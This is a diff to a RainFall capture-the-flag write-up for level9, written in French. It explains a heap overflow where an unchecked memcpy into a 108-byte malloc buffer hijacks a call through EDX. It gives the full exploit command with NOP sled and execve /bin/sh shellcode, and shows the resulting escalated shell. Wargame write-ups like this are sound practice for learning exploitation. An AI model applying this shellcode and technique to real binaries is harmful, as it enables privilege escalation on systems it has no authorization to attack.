@@ -22,3 +22,20 @@ level9@RainFall:~$ ./level9 `python -c 'print("\x0c\xa0\x04\x08\x90\x90\x90\x90\
 $ id
 uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
 $
+================================================================================
+Nous avons un programme qui presente une faille de type buffer overflow sur un depassement de malloc mal ecrit.
+
+Nous avons un malloc de 108 octets, un strlen de argv[1] et un memcpy.
+
+Le programme ne verifie pas la taille de la string qu'on lui envoie.
+
+Si nous envoyons une string de 108 contenant un shellcode + l'adresse du buffer dans lequel memcpy ecrit, EAX sera ecraser par cette adresse.
+
+Et comme juste apres il y a un mov EAX, EDX puis call EDX, notre shellcode sera executer.
+
+Sauf qu'il y a une particularite, le programme envoie l'adresse de EAX dans EDX.
+
+Il faut donc mettre l'adresse de notre buffer au debut du buffer :
+
+./level9 `python -c 'print("\x0c\xa0\x04\x08\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80\x0c\xa0\x04\x08")'`
+
